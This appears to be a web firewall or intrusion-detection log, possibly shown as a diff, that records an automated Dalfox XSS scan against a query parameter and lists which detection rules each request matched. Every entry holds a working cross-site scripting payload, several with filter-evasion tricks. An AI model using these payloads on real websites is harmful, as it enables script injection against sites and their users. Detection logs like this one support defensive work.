+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&#39;&gt;&lt;img/src/onerror=.1|alert``+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;svg/OnLoad=&#34;`${prompt``}`&#34;+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;xmp&gt;&lt;p+title=&#34;&lt;/xmp&gt;&lt;svg/onload=prompt.valueOf()(1)+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=prompt(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=alert.bind()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:confirm(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt(1)+class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt+class=dalfox>alert.bind()(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;a+href=javas&amp;#99;ript:alert(1)/class=dalfox&gt;click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:print(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad"><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'><sVg/onload=alert(1) id=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=alert.bind()(1)&gt;
